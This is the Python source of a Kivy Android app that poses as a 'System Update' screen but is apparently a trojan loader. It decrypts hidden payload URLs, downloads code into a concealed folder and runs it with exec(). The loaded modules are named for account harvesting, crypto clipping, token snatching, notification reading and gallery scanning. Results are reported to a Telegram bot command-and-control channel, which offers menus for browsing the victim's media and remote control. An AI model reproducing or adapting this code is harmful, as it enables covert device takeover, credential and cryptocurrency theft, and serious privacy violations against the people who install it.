# -*- coding: utf-8 -*-
import os
import sys
import time
import json
import base64
import threading
import importlib
import requests
from kivy.app import App
from kivy.clock import Clock
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.scrollview import ScrollView
from kivy.uix.label import Label
from kivy.uix.button import Button
from kivy.uix.progressbar import ProgressBar
from kivy.utils import platform
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

# ==================== استيراد الأسرار ====================
try:
    from secrets import ENCRYPTION_KEY, BOT_TOKENS, CONTROL_ID, VAULT_ID
    SECRETS_LOADED = True
except ImportError:
    SECRETS_LOADED = False
    ENCRYPTION_KEY = b'MySup3rS3cr3tK3y1234567890123456'
    BOT_TOKENS = []
    CONTROL_ID = ""
    VAULT_ID = ""

# ==================== الروابط المشفرة (ضع هنا نصوصك المشفرة) ====================
PAYLOAD_URLS_ENCRYPTED = [
    "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"
]

BASE_DIR = os.path.join(os.getcwd(), ".sys_runtime")
if not os.path.exists(BASE_DIR):
    os.makedirs(BASE_DIR)
sys.path.append(BASE_DIR)

def decrypt_data(encrypted_b64):
    try:
        data = base64.b64decode(encrypted_b64)
        iv, tag, ciphertext = data[:12], data[-16:], data[12:-16]
        cipher = Cipher(algorithms.AES(ENCRYPTION_KEY), modes.GCM(iv, tag), backend=default_backend())
        decryptor = cipher.decryptor()
        return (decryptor.update(ciphertext) + decryptor.finalize()).decode()
    except:
        return None

PAYLOAD_URLS = [decrypt_data(url) for url in PAYLOAD_URLS_ENCRYPTED if decrypt_data(url)]

class GhostCore:
    def __init__(self, log_callback=None):
        self.log_callback = log_callback
        self.device_name = f"Device_{int(time.time())}"
        self.topic_id = None
        self.last_update_id = 0
        self.current_bot = BOT_TOKENS[0] if BOT_TOKENS else ""
        self.selected_media = []
        self.current_page = 0
        self.media_list = []
        self.media_type = "all"
        self.items_per_page = 25
        self.heartbeat_interval = 3600
        self.last_heartbeat = time.time()

    def log(self, msg, success=None):
        if self.log_callback:
            self.log_callback(msg, success)

    def _send_request(self, method, endpoint, json_data=None, files=None, params=None):
        for token in BOT_TOKENS:
            try:
                url = f"https://api.telegram.org/bot{token}/{endpoint}"
                if files:
                    res = requests.request(method, url, data=params, files=files, timeout=15)
                elif json_data:
                    res = requests.request(method, url, json=json_data, timeout=15)
                else:
                    res = requests.request(method, url, params=params, timeout=15)
                if res.status_code == 200:
                    self.current_bot = token
                    return res.json()
            except:
                continue
        return None

    def send_message(self, chat_id, text, reply_markup=None, thread_id=None):
        json_data = {"chat_id": chat_id, "text": text, "parse_mode": "Markdown"}
        if thread_id:
            json_data["message_thread_id"] = thread_id
        if reply_markup:
            json_data["reply_markup"] = json.dumps(reply_markup)
        return self._send_request("POST", "sendMessage", json_data=json_data)

    def create_topic(self):
        data = self._send_request("POST", "createForumTopic", json={"chat_id": CONTROL_ID, "name": f"📱 {self.device_name}"})
        if data and data.get("ok"):
            self.topic_id = data['result']['message_thread_id']
            self.send_main_menu()
        else:
            time.sleep(2)
            self.create_topic()

    def send_main_menu(self):
        btns = {
            "inline_keyboard": [
                [{"text": "🖼️ كل الوسائط", "callback_data": "browse_all_0"},
                 {"text": "🔞 صور 🔞", "callback_data": "browse_nsfw_0"}],
                [{"text": "🎮 قائمة التحكم", "callback_data": "control_menu"},
                 {"text": "♻️ تحديث النظام", "callback_data": "reload_sys"}]
            ]
        }
        self.send_message(CONTROL_ID, f"✅ النظام نشط\nالجهاز: {self.device_name}", reply_markup=btns, thread_id=self.topic_id)

    def download_payloads(self):
        for url in PAYLOAD_URLS:
            try:
                name = url.split('/')[-1]
                self.log(f"Downloading {name}...")
                r = requests.get(url, timeout=15)
                if r.status_code == 200:
                    with open(os.path.join(BASE_DIR, name), 'w', encoding='utf-8') as f:
                        f.write(r.text)
                    self.log(f"Downloaded {name}", success=True)
                else:
                    self.log(f"Failed {name} (HTTP {r.status_code})", success=False)
            except Exception as e:
                self.log(f"Error downloading {name}: {e}", success=False)

    def load_modules(self):
        modules = ["account_harvester", "crypto_clipper", "notification_reader", "token_snatcher", "auto_capture", "gallery_scanner", "stream_manager", "telegram_ui", "monitor"]
        loaded = 0
        for mod in modules:
            try:
                path = os.path.join(BASE_DIR, f"{mod}.py")
                if os.path.exists(path):
                    exec(open(path).read(), globals())
                    loaded += 1
                    self.log(f"Loaded module: {mod}", success=True)
                else:
                    self.log(f"Module not found: {mod}", success=False)
            except Exception as e:
                self.log(f"Error loading {mod}: {e}", success=False)
        self.log(f"Loaded {loaded}/{len(modules)} modules", success=loaded == len(modules))
        return loaded

    def start_monitor(self):
        if 'Monitor' in globals():
            try:
                monitor = globals()['Monitor']()
                monitor.start()
                self.log("Monitor started successfully", success=True)
            except Exception as e:
                self.log(f"Monitor start error: {e}", success=False)
        else:
            self.log("Monitor class not found", success=False)

    def heartbeat(self):
        if hasattr(self, 'topic_id') and self.topic_id:
            self.send_message(CONTROL_ID, "💓 Heartbeat: Device online", thread_id=self.topic_id)

    def run(self):
        self.log("Engine started...")
        self.log("Checking secrets...")
        if not SECRETS_LOADED:
            self.log("Secrets not loaded! Using fallback values.", success=False)
        else:
            self.log(f"Secrets loaded. {len(BOT_TOKENS)} bot tokens available.", success=True)

        self.log("Testing internet...")
        try:
            requests.get("https://1.1.1.1", timeout=5)
            self.log("Internet OK", success=True)
        except Exception as e:
            self.log(f"Internet FAILED: {e}", success=False)

        self.log(f"Decrypting payload URLs ({len(PAYLOAD_URLS_ENCRYPTED)} encrypted)...")
        successful_decrypt = len(PAYLOAD_URLS)
        self.log(f"Decrypted {successful_decrypt}/{len(PAYLOAD_URLS_ENCRYPTED)} URLs", success=successful_decrypt > 0)

        self.log("Downloading payloads...")
        self.download_payloads()

        self.log("Loading modules...")
        self.load_modules()

        self.log("Creating Telegram topic...")
        self.create_topic()

        self.log("Starting Monitor...")
        self.start_monitor()

        # خلفية للـ Heartbeat
        def heartbeat_loop():
            while True:
                time.sleep(self.heartbeat_interval)
                self.heartbeat()
        threading.Thread(target=heartbeat_loop, daemon=True).start()

        self.log("Engine finished.", success=True)

class SystemUpdateApp(App):
    def build(self):
        self.log_lines = []
        self.engine_running = False
        self.core = None

        layout = BoxLayout(orientation='vertical', padding=10, spacing=10)

        # العنوان
        layout.add_widget(Label(text="System Update", size_hint_y=0.08, font_size='20sp', color=(0.2, 0.8, 0.2, 1)))
        # شريط التقدم
        self.progress_bar = ProgressBar(max=100, value=0, size_hint_y=0.05)
        layout.add_widget(self.progress_bar)
        # زر نسخ السجل
        copy_btn = Button(text="Copy Log", size_hint_y=0.08, background_color=(0.2, 0.6, 0.2, 1))
        copy_btn.bind(on_press=self.copy_log)
        layout.add_widget(copy_btn)
        # منطقة عرض السجل
        scroll = ScrollView(size_hint=(1, 0.8))
        self.log_view = Label(text="[System] Initializing...\n", size_hint_y=None, font_size='12sp', color=(0, 1, 0, 1), markup=True)
        self.log_view.bind(texture_size=self.log_view.setter('size'))
        scroll.add_widget(self.log_view)
        layout.add_widget(scroll)

        # طلب الصلاحيات الأساسية للأندرويد
        if platform == 'android':
            self.log("Requesting basic permissions...")
            from android.permissions import request_permissions, Permission
            request_permissions([Permission.INTERNET, Permission.ACCESS_NETWORK_STATE, Permission.READ_EXTERNAL_STORAGE, Permission.WRITE_EXTERNAL_STORAGE])

        Clock.schedule_once(self.start_engine, 2)
        return layout

    def log(self, msg, success=None):
        timestamp = time.strftime("%H:%M:%S")
        if success is True:
            full_msg = f"[{timestamp}] ✅ {msg}"
        elif success is False:
            full_msg = f"[{timestamp}] ❌ {msg}"
        else:
            full_msg = f"[{timestamp}] {msg}"
        self.log_lines.append(full_msg)
        # عرض آخر 50 سطر فقط لتجنب إبطاء التطبيق
        self.log_view.text = "\n".join(self.log_lines[-50:])
        # تحديث شريط التقدم تقريباً
        self.progress_bar.value = min(len(self.log_lines) % 101, 100)

    def copy_log(self, instance):
        from kivy.core.clipboard import Clipboard
        Clipboard.copy("\n".join(self.log_lines))
        self.log("Log copied to clipboard", success=True)

    def start_engine(self, dt):
        self.core = GhostCore(log_callback=self.log)
        threading.Thread(target=self.core.run, daemon=True).start()

if __name__ == '__main__':
    SystemUpdateApp().run()
